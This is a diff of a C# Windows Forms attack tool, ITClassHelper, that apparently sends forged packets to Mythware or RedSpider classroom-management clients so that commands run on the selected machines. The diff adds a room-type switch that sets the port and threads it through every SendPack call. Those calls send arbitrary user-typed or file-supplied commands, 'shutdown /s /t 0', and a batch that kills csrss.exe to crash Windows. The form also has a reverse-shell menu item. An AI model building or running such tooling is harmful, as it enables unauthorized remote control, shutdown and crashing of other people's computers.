@@ -14,6 +14,8 @@ namespace ITClassHelper
 {
     public partial class FormDeviceManage : Form
     {
+        static PackAttacker.RoomType roomType;
+
         public FormDeviceManage()
         {
             InitializeComponent();
@@ -99,7 +101,7 @@ namespace ITClassHelper
         private void SendCmdMenuItem_Click(object sender, EventArgs e)
         {
             string command = Interaction.InputBox("请输入要发送的命令：", "信息");
-            PackAttacker.SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text));
+            PackAttacker.SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
         }
 
         private void SendMsgMenuItem_Click(object sender, EventArgs e)
@@ -109,7 +111,7 @@ namespace ITClassHelper
             switch (msgMethod)
             {
                 case "1":
-                    PackAttacker.SendPack($"msg * {message}", GetSelectedIPs(), int.Parse(PortTextBox.Text));
+                    PackAttacker.SendPack($"msg * {message}", GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
                     break;
 
                 case "2":
@@ -162,7 +164,7 @@ namespace ITClassHelper
                     {
                         string fileLine;
                         while ((fileLine = sr.ReadLine()) != null)
-                            PackAttacker.SendPack(fileLine, GetSelectedIPs(), int.Parse(PortTextBox.Text));
+                            PackAttacker.SendPack(fileLine, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
                     }
                 }
                 catch (ArgumentNullException)
@@ -254,7 +256,7 @@ namespace ITClassHelper
                     break;
 
                 case "3":
-                    PackAttacker.SendPack("shutdown /s /t 0", GetSelectedIPs(), int.Parse(PortTextBox.Text));
+                    PackAttacker.SendPack("shutdown /s /t 0", GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
                     break;
 
                 default:
@@ -292,7 +294,7 @@ namespace ITClassHelper
                 "taskkill /f /im csrss.exe"
             };
             foreach (string command in commands)
-                PackAttacker.SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text));
+                PackAttacker.SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
         }
 
         private void RevShellMenuItem_Click(object sender, EventArgs e)
@@ -304,6 +306,22 @@ namespace ITClassHelper
         {
             e.Cancel = true;
             Hide();
+        }
+
+        private void RoomTypeRadio_CheckedChanged(object sender, EventArgs e)
+        {
+            if (MythwareRoomRadio.Checked == true)
+            {
+                PortTextBox.Enabled = true;
+                PortTextBox.Text = "4605";
+                roomType = PackAttacker.RoomType.Mythware;
+            }
+            else
+            {
+                PortTextBox.Enabled = false;
+                PortTextBox.Text = "1689";
+                roomType = PackAttacker.RoomType.RedSpider;
+            }
         }
     }
 }
